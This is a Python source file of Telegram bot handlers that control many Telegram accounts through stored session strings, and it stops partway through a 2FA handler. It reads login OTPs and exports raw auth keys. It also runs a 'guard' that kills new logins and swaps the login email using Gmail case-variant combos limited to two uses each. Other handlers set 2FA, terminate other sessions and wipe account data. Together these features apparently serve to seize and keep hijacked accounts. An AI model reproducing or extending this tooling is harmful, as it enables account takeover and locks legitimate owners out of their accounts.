import logging
from datetime import datetime, timezone, timedelta

from telegram import Update
from telegram.ext import (
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    CommandHandler,
)
from telethon import functions
from telethon.tl import types
from telethon.errors import CodeInvalidError, RPCError

from config import API_ID, API_HASH, ALLOW_LOGIN_SECONDS
from database.models import (
    get_accounts_by_owner,
    get_account_by_id,
    update_account,
    delete_account,
    set_last_otp,
    is_authorized,
    get_mail,
    get_all_mails,
    remove_mail,
    increment_combo_use,
)
from keyboards.inline import (
    accounts_pagination_kb,
    account_detail_kb,
    main_menu_kb,
    full_operations_kb,
    fo_back_kb,
    fo_twofa_kb,
    clear_all_confirm_kb,
    cancel_kb,
    fo_device_dashboard_kb,
    fo_terminate_confirm_kb,
    fo_revoke_bot_confirm_kb,
    fo_clear_confirm_kb,
    change_mail_options_kb,
)
from utils.helpers import (
    check_spam_status,
    get_devices,
    fetch_otp,
    terminate_current_session,
    terminate_device,
    kill_other_sessions,
    clear_all_data,
    format_device,
    safe_edit,
    denied_text,
    get_2fa_status,
    set_2fa_password,
    remove_2fa_password,
    verify_mail,
    auto_set_login_email,
    generate_email_variants,
)
from utils.session_utils import verify_and_get_client
from utils.guard import GuardManager, start_guard

logger = logging.getLogger(__name__)

PAGE_VIEWING, ACCOUNT_DETAIL, FO_WAITING_EMAIL, FO_WAITING_CODE, FO_WAITING_2FA_SET, FO_WAITING_2FA_REMOVE = range(6)


async def _disconnect_detail(context, account_id):
    client = context.user_data.pop(f"detail_client_{account_id}", None)
    if client and client.is_connected():
        try:
            await client.disconnect()
        except Exception:
            pass


async def my_accounts_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
    user_id = update.effective_user.id

    if not await is_authorized(user_id):
        if query:
            await safe_edit(query, denied_text(update.effective_user.id))
        return ConversationHandler.END

    context.user_data["accounts_page"] = 0
    return await _show_accounts_page(update, context, user_id, 0)


async def _show_accounts_page(update, context, user_id: int, page: int):
    accounts = await get_accounts_by_owner(user_id)
    if not accounts:
        await _respond(update, "👤 **My Accounts**\n\nNo accounts stored yet.\nUse **Manage Account** to add one.", main_menu_kb())
        return ConversationHandler.END

    total_pages = max(1, (len(accounts) + 4) // 5)
    if page >= total_pages:
        page = total_pages - 1
    if page < 0:
        page = 0

    context.user_data["accounts_page"] = page

    start = page * 5
    end = min(start + 5, len(accounts))
    text = f"👤 **My Accounts** (Page {page + 1}/{total_pages})\n\n"
    for i in range(start, end):
        acc = accounts[i]
        text += f"├─ {i + 1}. **{acc.get('name', 'Unknown')}**  `{acc.get('phone', 'Unknown')}`\n"

    text += f"\nTotal: {len(accounts)} account(s)"

    await _respond(update, text, accounts_pagination_kb(accounts, page, total_pages))
    return PAGE_VIEWING


async def _respond(update, text, kb):
    if update.callback_query:
        await safe_edit(update.callback_query, text, parse_mode="Markdown", reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)


async def accounts_navigation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if data.startswith("acc_page:"):
        page = int(data.split(":", 1)[1])
        return await _show_accounts_page(update, context, user_id, page)
    if data == "acc_refresh":
        await _prune_invalid_accounts(context, user_id)
        page = context.user_data.get("accounts_page", 0)
        return await _show_accounts_page(update, context, user_id, page)
    if data.startswith("acc_view:"):
        account_id = data.split(":", 1)[1]
        return await _show_account_detail(update, context, account_id)

    return PAGE_VIEWING


async def _prune_invalid_accounts(context, user_id: int):
    """Verify every stored account and remove any whose session is dead."""
    accounts = await get_accounts_by_owner(user_id)
    manager = GuardManager(context.application)
    for acc in accounts:
        account_id = str(acc["_id"])
        client, info = await verify_and_get_client(
            acc.get("session_string") or acc.get("hex_key", ""),
            API_ID, API_HASH,
        )
        if client is None:
            await delete_account(account_id)
            await manager.stop_for_user(user_id, account_uid=acc.get("user_id"), notify=False)
            logger.info("Pruned dead account %s (uid %s)", account_id, acc.get("user_id"))
        else:
            if client.is_connected():
                try:
                    await client.disconnect()
                except Exception:
                    pass


async def _show_account_detail(update, context, account_id: str):
    query = update.callback_query
    account = await get_account_by_id(account_id)
    if not account:
        await safe_edit(query, "❌ Account not found.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    context.user_data["detail_account_id"] = account_id
    await _disconnect_detail(context, account_id)

    client, info = await verify_and_get_client(
        account.get("session_string") or account.get("hex_key", ""),
        API_ID, API_HASH,
    )

    if client:
        try:
            me = await client.get_me()
            devices = await get_devices(client)
            spam_status = await check_spam_status(client)

            info_text = (
                f"👤 **Account Detail**\n\n"
                f"├─ **Name**    : {account.get('name', 'Unknown')}\n"
                f"├─ **Phone**   : `{account.get('phone', 'Unknown')}`\n"
                f"├─ **User ID** : `{me.id}`\n"
                f"├─ **Devices** : {len(devices)}\n"
                f"└─ **Spam**    : {spam_status}\n"
            )
            context.user_data[f"detail_client_{account_id}"] = client
        except Exception as e:
            await _disconnect_detail(context, account_id)
            info_text = (
                f"👤 **Account Detail**\n\n"
                f"├─ **Name**    : {account.get('name', 'Unknown')}\n"
                f"├─ **Phone**   : `{account.get('phone', 'Unknown')}`\n"
                f"├─ **User ID** : `{account.get('user_id', '?')}`\n\n"
                f"⚠️ Could not fetch live data: {e}"
            )
    else:
        info_text = (
            f"👤 **Account Detail**\n\n"
            f"├─ **Name**    : {account.get('name', 'Unknown')}\n"
            f"├─ **Phone**   : `{account.get('phone', 'Unknown')}`\n"
            f"├─ **User ID** : `{account.get('user_id', '?')}`\n\n"
            "⚠️ Session expired."
        )

    manager = GuardManager(context.application)
    guard_active = manager.get(
        manager.key(update.effective_user.id, account.get("user_id", 0))
    ) is not None

    await safe_edit(query, info_text, parse_mode="Markdown",
                    reply_markup=account_detail_kb(account_id, guard_active))
    return ACCOUNT_DETAIL


async def account_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if data.startswith("acc_otp:"):
        account_id = data.split(":", 1)[1]
        client = context.user_data.get(f"detail_client_{account_id}")
        if not client or not client.is_connected():
            await safe_edit(query, "❌ Session expired.", reply_markup=account_detail_kb(account_id))
            return ACCOUNT_DETAIL

        await safe_edit(query, "🔍 Fetching OTP (this can take ~30s)...")
        account = await get_account_by_id(account_id)
        last_otp = account.get("last_otp") if account else None
        otp = await fetch_otp(client, attempts=8, delay=2.5)

        if otp:
            await set_last_otp(account_id, otp)
            tag = " (same as last time)" if last_otp == otp else ""
            text = (
                f"✅ **OTP Found!{tag}**\n\n"
                f"Account: **{account.get('name', 'Unknown')}**\n"
                f"Phone: `{account.get('phone', 'Unknown')}`\n\n"
                f"📨 **Code:** `{otp}`"
            )
        elif last_otp:
            text = (
                f"ℹ️ **No new OTP found.**\n\n"
                f"Account: **{account.get('name', 'Unknown')}**\n"
                f"Phone: `{account.get('phone', 'Unknown')}`\n\n"
                f"📨 **Last OTP:** `{last_otp}`"
            )
        else:
            text = "❌ No OTP found in recent messages."

        await safe_edit(query, text, parse_mode="Markdown", reply_markup=account_detail_kb(account_id))
        return ACCOUNT_DETAIL

    elif data.startswith("acc_revoke:"):
        account_id = data.split(":", 1)[1]
        account = await get_account_by_id(account_id)

        await safe_edit(query, "🔌 Revoking bot connection...")
        try:
            detail_client = context.user_data.get(f"detail_client_{account_id}")
            if detail_client and detail_client.is_connected():
                # Actually terminate the bot's session on the account
                await terminate_current_session(detail_client)
            await _disconnect_detail(context, account_id)
            if account:
                await delete_account(account_id)
                manager = GuardManager(context.application)
                await manager.stop_for_user(user_id, account_uid=account.get("user_id"), notify=False)
            await safe_edit(query, 
                "✅ **Bot connection revoked and account removed.**",
                reply_markup=main_menu_kb(),
            )
            return ConversationHandler.END
        except Exception as e:
            await safe_edit(query, f"❌ Error: {e}", reply_markup=account_detail_kb(account_id))
            return ACCOUNT_DETAIL

    elif data.startswith("acc_guard:"):
        account_id = data.split(":", 1)[1]
        account = await get_account_by_id(account_id)
        if not account:
            await safe_edit(query, "❌ Account not found.", reply_markup=main_menu_kb())
            return ConversationHandler.END

        account_uid = account.get("user_id", 0)
        manager = GuardManager(context.application)
        key = manager.key(user_id, account_uid)

        if manager.get(key):
            await manager.stop(key, notify=True)
            await update_account(account_id, {"guard_active": False})
        else:
            guard_client, info = await verify_and_get_client(
                account.get("session_string") or account.get("hex_key", ""),
                API_ID, API_HASH,
            )
            if guard_client is None:
                await safe_edit(query, f"❌ Could not connect for guard: {info}",
                                reply_markup=account_detail_kb(account_id))
                return ACCOUNT_DETAIL
            # Keep existing sessions; only NEW logins after this point are killed.
            await start_guard(context.application, user_id, account_uid,
                              guard_client, update.effective_chat.id)
            await update_account(account_id, {"guard_active": True})

        return await _show_account_detail(update, context, account_id)

    elif data.startswith("acc_allow:"):
        account_id = data.split(":", 1)[1]
        client = context.user_data.get(f"detail_client_{account_id}")
        if not client or not client.is_connected():
            await safe_edit(query, "❌ Session expired.", reply_markup=account_detail_kb(account_id))
            return ACCOUNT_DETAIL

        allow_until = datetime.now(timezone.utc) + timedelta(seconds=ALLOW_LOGIN_SECONDS)
        account = await get_account_by_id(account_id)
        await update_account(account_id, {"guard_allow_until": allow_until, "guard_active": True})

        # Also tell any running guard to honour this window
        manager = GuardManager(context.application)
        manager.allow_login(user_id, account.get("user_id", 0), allow_until)

        await safe_edit(query, 
            f"🔓 **Login Allowed for {ALLOW_LOGIN_SECONDS}s**\n\n"
            "Anyone can log into this account within the window.\n"
            "After that, guard mode will reactivate automatically.",
            parse_mode="Markdown",
            reply_markup=account_detail_kb(account_id),
        )
        return ACCOUNT_DETAIL

    return ACCOUNT_DETAIL


async def back_to_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    account_id = context.user_data.get("detail_account_id")
    if account_id:
        await _disconnect_detail(context, account_id)
        context.user_data.pop("detail_account_id", None)

    page = context.user_data.get("accounts_page", 0)
    return await _show_accounts_page(update, context, user_id, page)


async def back_main_cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to the main menu, disconnecting any detail client first."""
    query = update.callback_query
    await query.answer()

    account_id = context.user_data.get("detail_account_id")
    if account_id:
        await _disconnect_detail(context, account_id)
        context.user_data.pop("detail_account_id", None)

    from handlers.start import WELCOME_TEXT
    await safe_edit(query, WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_kb())
    return ConversationHandler.END



# ═══════════════════════════════════════════════════════════════════════════
#  FULL OPERATIONS (from My Accounts)
# ═══════════════════════════════════════════════════════════════════════════
async def full_ops_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    account_id = query.data.split(":", 1)[1]
    account = await get_account_by_id(account_id)
    if not account:
        await safe_edit(query, "❌ Account not found.", reply_markup=main_menu_kb())
        return ACCOUNT_DETAIL

    # Ensure client is connected
    client = context.user_data.get(f"detail_client_{account_id}")
    if not client or not client.is_connected():
        client, info = await verify_and_get_client(
            account.get("session_string") or account.get("hex_key", ""),
            API_ID, API_HASH,
        )
        if client is None:
            await safe_edit(query, f"❌ Session expired: {info}", reply_markup=account_detail_kb(account_id))
            return ACCOUNT_DETAIL
        context.user_data[f"detail_client_{account_id}"] = client

    manager = GuardManager(context.application)
    guard_active = manager.get(
        manager.key(update.effective_user.id, account.get("user_id", 0))
    ) is not None

    text = (
        f"⚙️ **Full Operations**\n\n"
        f"Account: **{account.get('name', 'Unknown')}**\n"
        f"Phone: `{account.get('phone', 'Unknown')}`\n\n"
        "Choose an action:"
    )
    await safe_edit(query, text, parse_mode="Markdown",
                    reply_markup=full_operations_kb(account_id, guard_active))
    return ACCOUNT_DETAIL


async def full_ops_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    user_id = update.effective_user.id

    # Dedicated handlers for mail auto/manual — skip if registration order is wrong
    if data in ("fo_mail_auto", "fo_mail_manual") or data.startswith("fo_mail_"):
        return ACCOUNT_DETAIL

    # fo_ACTION:ACCOUNT_ID  or fo_2fa_xxx:ACCOUNT_ID
    if data.startswith("fo_2fa_"):
        parts = data.split(":")
        if len(parts) < 2:
            await safe_edit(query, "❌ Invalid button data.", reply_markup=main_menu_kb())
            return ACCOUNT_DETAIL
        action = parts[0]  # fo_2fa_set / fo_2fa_remove / fo_2fa_status
        account_id = parts[1]
    else:
        parts = data.split(":", 1)
        if len(parts) < 2:
            await safe_edit(query, "❌ Invalid button data.", reply_markup=main_menu_kb())
            return ACCOUNT_DETAIL
        action = parts[0]  # fo_devices, fo_clear, ...
        account_id = parts[1]

    account = await get_account_by_id(account_id)
    if not account:
        await safe_edit(query, "❌ Account not found.", reply_markup=main_menu_kb())
        return ACCOUNT_DETAIL

    client = context.user_data.get(f"detail_client_{account_id}")
    if not client or not client.is_connected():
        client, info = await verify_and_get_client(
            account.get("session_string") or account.get("hex_key", ""),
            API_ID, API_HASH,
        )
        if client is None:
            await safe_edit(query, f"❌ Session lost: {info}")
            return ACCOUNT_DETAIL
        context.user_data[f"detail_client_{account_id}"] = client

    if action == "fo_devices":
        return await fo_show_devices(update, context, account_id, client, account)

    if action == "fo_clear":
        await safe_edit(
            query,
            "⚠️ **Clear All Data?**\n\n"
            "This will delete contacts, leave groups/channels, and clear saved messages.\n"
            "This cannot be undone.",
            parse_mode="Markdown",
            reply_markup=fo_clear_confirm_kb(account_id),
        )
        return ACCOUNT_DETAIL

    if action == "fo_clear_yes":
        await safe_edit(query, "🗑️ Clearing all data (contacts, DMs, groups)...")
        result = await clear_all_data(client)
        text = (
            f"✅ **Clear All finished**\n\n"
            f"├─ Contacts deleted: {result.get('contacts', 0)}\n"
            f"├─ Dialogs left: {result.get('dialogs', 0)}\n"
            f"└─ Saved messages: {result.get('saved', False)}"
        )
        await safe_edit(query, text, parse_mode="Markdown", reply_markup=fo_back_kb(account_id))
        return ACCOUNT_DETAIL

    if action == "fo_otp":
        await safe_edit(query, "🔍 Fetching OTP...")
        otp = await fetch_otp(client, attempts=8, delay=2.5)
        last = account.get("last_otp")
        if otp:
            await set_last_otp(account_id, otp)
            tag = " (same as last)" if last == otp else ""
            text = f"✅ **OTP Found!{tag}**\n\n📨 `{otp}`"
        elif last:
            text = f"ℹ️ No new OTP.\nLast: `{last}`"
        else:
            text = "❌ No OTP found."
        await safe_edit(query, text, parse_mode="Markdown", reply_markup=fo_back_kb(account_id))
        return ACCOUNT_DETAIL

    if action == "fo_export":
        hex_key = account.get("hex_key") or ""
        if not hex_key:
            try:
                ak = client.session.auth_key
                if ak and hasattr(ak, "key"):
                    hex_key = ak.key.hex()
            except Exception:
                pass
        text = f"📤 **Export Hex**\n\n`{hex_key}`" if hex_key else "❌ No hex available."
        await safe_edit(query, text, parse_mode="Markdown", reply_markup=fo_back_kb(account_id))
        return ACCOUNT_DETAIL

    if action == "fo_checkmail":
        from database.models import get_mail
        mail = await get_mail(user_id)
        if not mail:
            await safe_edit(query, "❌ No mail saved. Use /addmail first.",
                            reply_markup=fo_back_kb(account_id))
            return ACCOUNT_DETAIL
        await safe_edit(query, "🧪 Checking mail...")
        result = await verify_mail(mail["email"], mail["app_password"])
        if result.get("ok"):
            text = (
                f"✅ **Mail OK**\n\n"
                f"Email: `{mail['email']}`\n"
                f"Host: {result.get('host')}\n"
                f"Unread: {result.get('unread')}\n"
                f"Telegram mails: {result.get('telegram_emails')}"
            )
        else:
            text = f"❌ Mail check failed: {result.get('error')}"
        await safe_edit(query, text, parse_mode="Markdown", reply_markup=fo_back_kb(account_id))
        return ACCOUNT_DETAIL

    if action == "fo_changemail":
        return await fo_ask_change_mail(update, context, account_id, client)

    if action == "fo_2fa":
        await safe_edit(query, "🔐 **2FA**", parse_mode="Markdown",
                        reply_markup=fo_twofa_kb(account_id))
        return ACCOUNT_DETAIL

    if action == "fo_2fa_status":
        status = await get_2fa_status(client)
        if status.get("enabled"):
            text = f"✅ 2FA enabled. Hint: `{status.get('hint') or '—'}`"
        else:
            text = "ℹ️ 2FA is not enabled."
        await safe_edit(query, text, parse_mode="Markdown", reply_markup=fo_twofa_kb(account_id))
        return ACCOUNT_DETAIL

    if action == "fo_2fa_set":
        return await fo_ask_2fa_set(update, context, account_id, client)

    if action == "fo_2fa_remove":
        return await fo_ask_2fa_remove(update, context, account_id, client)

    if action == "fo_guard":
        manager = GuardManager(context.application)
        account_uid = account.get("user_id", 0)
        key = manager.key(user_id, account_uid)
        if manager.get(key):
            await manager.stop(key, notify=True)
            await update_account(account_id, {"guard_active": False})
            msg = "🛡️ Guard stopped."
            active = False
        else:
            await start_guard(context.application, user_id, account_uid,
                              client, update.effective_chat.id)
            await update_account(account_id, {"guard_active": True})
            msg = "🛡️ Guard started."
            active = True
        await safe_edit(query, msg, reply_markup=full_operations_kb(account_id, active))
        return ACCOUNT_DETAIL

    return ACCOUNT_DETAIL



# ═══════════════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════════════
#  Full Ops — Device Dashboard (full features)
# ═══════════════════════════════════════════════════════════════════════════
async def fo_show_devices(update, context, account_id: str, client, account):
    query = update.callback_query
    devices = await get_devices(client)
    context.user_data[f"fo_device_list_{account_id}"] = devices

    manager = GuardManager(context.application)
    guard_active = manager.get(
        manager.key(update.effective_user.id, account.get("user_id", 0))
    ) is not None

    if not devices:
        await safe_edit(
            query,
            "📱 **Device Dashboard**\n\nNo active sessions found.",
            parse_mode="Markdown",
            reply_markup=fo_back_kb(account_id),
        )
        return ACCOUNT_DETAIL

    text = "📱 **Device Dashboard**\n\n"
    for i, d in enumerate(devices):
        text += format_device(d, i) + "\n"
    text += "_Tap a device to terminate it._"

    await safe_edit(
        query, text, parse_mode="Markdown",
        reply_markup=fo_device_dashboard_kb(account_id, devices, guard_active),
    )
    return ACCOUNT_DETAIL


async def fo_device_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle fo_dev:, fo_dev_yes:, fo_revoke_all:, fo_revoke_bot:, fo_revoke_bot_yes:"""
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    # Parse account_id and optional index
    # fo_dev:ACCOUNT:IDX
    # fo_dev_yes:ACCOUNT:IDX
    # fo_revoke_all:ACCOUNT
    # fo_revoke_bot:ACCOUNT
    # fo_revoke_bot_yes:ACCOUNT
    parts = data.split(":")
    action = parts[0]

    if action in ("fo_dev", "fo_dev_yes"):
        if len(parts) < 3:
            return ACCOUNT_DETAIL
        account_id = parts[1]
        idx = int(parts[2])
    else:
        account_id = parts[1] if len(parts) > 1 else None

    if not account_id:
        return ACCOUNT_DETAIL

    account = await get_account_by_id(account_id)
    if not account:
        await safe_edit(query, "❌ Account not found.", reply_markup=main_menu_kb())
        return ACCOUNT_DETAIL

    client = context.user_data.get(f"detail_client_{account_id}")
    if not client or not client.is_connected():
        client, info = await verify_and_get_client(
            account.get("session_string") or account.get("hex_key", ""),
            API_ID, API_HASH,
        )
        if client is None:
            await safe_edit(query, f"❌ Session lost: {info}")
            return ACCOUNT_DETAIL
        context.user_data[f"detail_client_{account_id}"] = client

    devices = context.user_data.get(f"fo_device_list_{account_id}") or await get_devices(client)

    if action == "fo_dev":
        if 0 <= idx < len(devices):
            dev = devices[idx]
            await safe_edit(
                query,
                f"⚠️ **Terminate This Device?**\n\n{format_device(dev, idx)}",
                parse_mode="Markdown",
                reply_markup=fo_terminate_confirm_kb(account_id, idx),
            )
        return ACCOUNT_DETAIL

    if action == "fo_dev_yes":
        if 0 <= idx < len(devices):
            dev = devices[idx]
            await safe_edit(query, "🔄 Terminating device...")
            if dev.get("current"):
                ok = await terminate_current_session(client)
                if ok:
                    await delete_account(account_id)
                    manager = GuardManager(context.application)
                    await manager.stop_for_user(user_id, account_uid=account.get("user_id"), notify=False)
                    context.user_data.pop(f"detail_client_{account_id}", None)
                    await safe_edit(
                        query,
                        "✅ **Bot session terminated.**\n\nAccount removed from storage.",
                        reply_markup=main_menu_kb(),
                    )
                    return ConversationHandler.END
                await safe_edit(query, "❌ Failed to terminate bot session.",
                                reply_markup=fo_back_kb(account_id))
                return ACCOUNT_DETAIL

            ok = await terminate_device(client, dev["hash"])
            msg = "✅ **Device terminated!**" if ok else "❌ Failed to terminate device."
            await safe_edit(query, msg, parse_mode="Markdown")
            # refresh list
            return await fo_show_devices(update, context, account_id, client, account)
        return ACCOUNT_DETAIL

    if action == "fo_revoke_all":
        await safe_edit(query, "🔌 Terminating all other sessions...")
        try:
            count = await kill_other_sessions(client)
            msg = f"✅ Terminated **{count}** other session(s)."
        except Exception as e:
            msg = f"❌ Failed: {e}"
        await safe_edit(query, msg, parse_mode="Markdown")
        return await fo_show_devices(update, context, account_id, client, account)

    if action == "fo_revoke_bot":
        await safe_edit(
            query,
            "🔴 **Revoke Bot Connection?**\n\n"
            "This will log the bot out of this account and remove it from storage.",
            parse_mode="Markdown",
            reply_markup=fo_revoke_bot_confirm_kb(account_id),
        )
        return ACCOUNT_DETAIL

    if action == "fo_revoke_bot_yes":
        await safe_edit(query, "🔌 Revoking bot connection...")
        try:
            await terminate_current_session(client)
        except Exception:
            pass
        context.user_data.pop(f"detail_client_{account_id}", None)
        await delete_account(account_id)
        manager = GuardManager(context.application)
        await manager.stop_for_user(user_id, account_uid=account.get("user_id"), notify=False)
        await safe_edit(
            query,
            "✅ **Bot connection revoked and account removed.**",
            reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END

    return ACCOUNT_DETAIL


#  Full Ops — Change Mail (interactive, same as Manage Account)
# ═══════════════════════════════════════════════════════════════════════════
async def fo_ask_change_mail(update, context, account_id: str, client):
    """Start Change Mail from Full Operations — offer auto or manual."""
    query = update.callback_query
    user_id = update.effective_user.id

    try:
        pwd = await client(functions.account.GetPasswordRequest())
    except RPCError as e:
        await safe_edit(query, f"❌ Could not read account status: {e}",
                        reply_markup=fo_back_kb(account_id))
        return ACCOUNT_DETAIL

    current = (getattr(pwd, "login_email_pattern", "") or "").strip()
    if not current:
        await safe_edit(
            query,
            "❌ **This account doesn't have a login mail option.**\n\n"
            "No login email is configured on this account, so there is nothing "
            "to change.",
            parse_mode="Markdown",
            reply_markup=fo_back_kb(account_id),
        )
        return ACCOUNT_DETAIL

    context.user_data["fo_change_mail_account_id"] = account_id
    context.user_data["fo_change_mail_client_key"] = f"detail_client_{account_id}"

    all_mails = await get_all_mails(user_id)
    has_saved = bool(all_mails)

    text = (
        f"📧 **Change Login Email**\n\n"
        f"├─ Current login email: `{current}`\n"
    )
    if has_saved:
        total_combos = sum(len(generate_email_variants(m["email"])) for m in all_mails)
        mail_list = ", ".join(f"`{m['email']}`" for m in all_mails[:5])
        if len(all_mails) > 5:
            mail_list += f" +{len(all_mails) - 5} more"
        text += (
            f"├─ Saved mailboxes: **{len(all_mails)}** ({mail_list})\n"
            f"└─ Combos ready: **{total_combos}** (each usable on 2 accounts)\n\n"
            "Tap **Use Saved Mail** — tries every combo across all Gmails; "
            "on any error auto-shifts to the next combo."
        )
    else:
        text += (
            "\n_No mail saved. Use `/addmail email app_password` first "
            "(you can add multiple Gmails)._"
        )

    await safe_edit(
        query,
        text,
        parse_mode="Markdown",
        reply_markup=change_mail_options_kb(has_saved_mail=has_saved, prefix="fo"),
    )
    return ACCOUNT_DETAIL  # option buttons drive next step


async def fo_start_manual_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User chose manual email entry in Full Ops."""
    query = update.callback_query
    await query.answer()
    account_id = context.user_data.get("fo_change_mail_account_id")
    if not account_id:
        await safe_edit(query, "❌ Session lost. Open Full Operations again.")
        return ConversationHandler.END
    await safe_edit(
        query,
        "📧 **Change Login Email — Manual**\n\n"
        "Send the **new email address** you want to use as the login email.",
        parse_mode="Markdown",
        reply_markup=cancel_kb("fo_mail"),
    )
    return FO_WAITING_EMAIL


async def fo_run_auto_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """One-click auto change mail with case variants (Full Ops)."""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    account_id = context.user_data.get("fo_change_mail_account_id")
    client_key = context.user_data.get("fo_change_mail_client_key")
    client = context.user_data.get(client_key) if client_key else None

    if not account_id or not client or not client.is_connected():
        await safe_edit(query, "❌ Session lost. Open Full Operations again.")
        return ConversationHandler.END

    all_mails = await get_all_mails(user_id)
    if not all_mails:
        await safe_edit(
            query,
            "❌ No mail saved. Use `/addmail email app_password` first "
            "(you can add several Gmails).",
            parse_mode="Markdown",
            reply_markup=full_operations_kb(account_id),
        )
        return ACCOUNT_DETAIL

    total_combos = sum(len(generate_email_variants(m["email"])) for m in all_mails)
    await safe_edit(
        query,
        f"⚡ **Auto Change Mail**\n\n"
        f"├─ Mailboxes: **{len(all_mails)}**\n"
        f"├─ Combos: **{total_combos}** (max 2 uses each)\n"
        f"└─ Trying… shifts to next combo/Gmail on any error.",
        parse_mode="Markdown",
    )

    async def progress(variant, idx, total):
        try:
            await query.edit_message_text(
                f"⚡ **Auto Change Mail**\n\n"
                f"├─ Trying `{variant}`\n"
                f"├─ Progress: **{idx}/{total}**\n"
                f"└─ On error → next combo automatically…",
                parse_mode="Markdown",
            )
        except Exception:
            pass

    result = await auto_set_login_email(
        client,
        base_email=all_mails[0]["email"],
        app_password=all_mails[0]["app_password"],
        mailboxes=all_mails,
        wait_seconds=70,
        progress_cb=progress,
        max_uses_per_combo=2,
    )

    # cleanup pending
    for k in ("fo_pending_email", "fo_change_mail_account_id", "fo_change_mail_client_key"):
        context.user_data.pop(k, None)

    if result.get("ok"):
        try:
            await increment_combo_use(
                user_id,
                result.get("email_lower") or all_mails[0]["email"].lower(),
                result["email"],
            )
        except Exception:
            pass
        await safe_edit(
            query,
            f"✅ **Mail updated!**\n\n"
            f"├─ New login email: `{result['email']}`\n"
            f"├─ Mailbox: `{result.get('mailbox', '?')}`\n"
            f"├─ Combos tried: {result['tried']}\n"
            f"└─ Code auto-captured from inbox.",
            parse_mode="Markdown",
            reply_markup=full_operations_kb(account_id),
        )
    else:
        await safe_edit(
            query,
            f"❌ **Auto change failed**\n\n"
            f"├─ Tried: {result.get('tried', 0)} combo(s)\n"
            f"├─ Last error: `{result.get('last_error', 'unknown')}`\n\n"
            f"_Add another Gmail with `/addmail email app_password` "
            f"or free combos (each combo max 2 accounts)._",
            parse_mode="Markdown",
            reply_markup=full_operations_kb(account_id),
        )
    return ACCOUNT_DETAIL


async def fo_receive_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive new email, request verification code from Telegram."""
    email = (update.message.text or "").strip()
    account_id = context.user_data.get("fo_change_mail_account_id")
    client_key = context.user_data.get("fo_change_mail_client_key")
    client = context.user_data.get(client_key) if client_key else None


    if not account_id or not client or not client.is_connected():
        await update.message.reply_text("❌ Session lost. Open Full Operations again.")
        return ConversationHandler.END

    if "@" not in email or "." not in email:
        await update.message.reply_text(
            "❌ Invalid email. Send a valid email address.",
            reply_markup=cancel_kb("fo_mail"),
        )
        return FO_WAITING_EMAIL

    context.user_data["fo_pending_email"] = email

    try:
        await client(functions.account.SendVerifyEmailCodeRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            email=email,
        ))
    except RPCError as e:
        await update.message.reply_text(
            f"❌ Could not send verification code: {e}",
            reply_markup=cancel_kb("fo_mail"),
        )
        return FO_WAITING_EMAIL

    await update.message.reply_text(
        f"📧 Verification code sent to `{email}`.\n\n"
        f"Send the **code** you received.",
        parse_mode="Markdown",
        reply_markup=cancel_kb("fo_mail"),
    )
    return FO_WAITING_CODE


async def fo_receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive OTP and finish login-email change."""
    code = (update.message.text or "").strip()
    email = context.user_data.get("fo_pending_email")
    account_id = context.user_data.get("fo_change_mail_account_id")
    client_key = context.user_data.get("fo_change_mail_client_key")
    client = context.user_data.get(client_key) if client_key else None


    if not account_id or not client or not client.is_connected():
        await update.message.reply_text("❌ Session lost. Open Full Operations again.")
        return ConversationHandler.END

    try:
        await client(functions.account.VerifyEmailRequest(
            purpose=types.EmailVerifyPurposeLoginChange(),
            verification=types.EmailVerificationCode(code=code),
        ))
    except CodeInvalidError:
        await update.message.reply_text(
            "❌ Invalid code. Send the correct code.",
            reply_markup=cancel_kb("fo_mail"),
        )
        return FO_WAITING_CODE
    except RPCError as e:
        await update.message.reply_text(
            f"❌ Verification failed: {e}",
            reply_markup=cancel_kb("fo_mail"),
        )
        return FO_WAITING_CODE

    # Cleanup pending state
    for k in ("fo_pending_email", "fo_change_mail_account_id", "fo_change_mail_client_key"):
        context.user_data.pop(k, None)

    await update.message.reply_text(
        f"✅ **Mail updated!**\n\nNew login email: `{email}`",
        parse_mode="Markdown",
        reply_markup=full_operations_kb(account_id),
    )
    return ACCOUNT_DETAIL


async def fo_cancel_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel Change Mail from Full Ops."""
    query = update.callback_query
    if query:
        await query.answer()
    account_id = context.user_data.pop("fo_change_mail_account_id", None)
    context.user_data.pop("fo_pending_email", None)
    context.user_data.pop("fo_change_mail_client_key", None)

    if account_id and query:
        await safe_edit(
            query,
            "❌ Change Mail cancelled.",
            reply_markup=full_operations_kb(account_id),
        )
        return ACCOUNT_DETAIL
    if update.message:
        await update.message.reply_text("❌ Change Mail cancelled.", reply_markup=main_menu_kb())
    return ConversationHandler.END



# ═══════════════════════════════════════════════════════════════════════════
#  Full Ops — 2FA (interactive)
# ═══════════════════════════════════════════════════════════════════════════
async def fo_ask_2fa_set(update, context, account_id: str, client):
    """Ask for password(s) to set/change 2FA."""
    query = update.callback_query
    context.user_data["fo_2fa_account_id"] = account_id
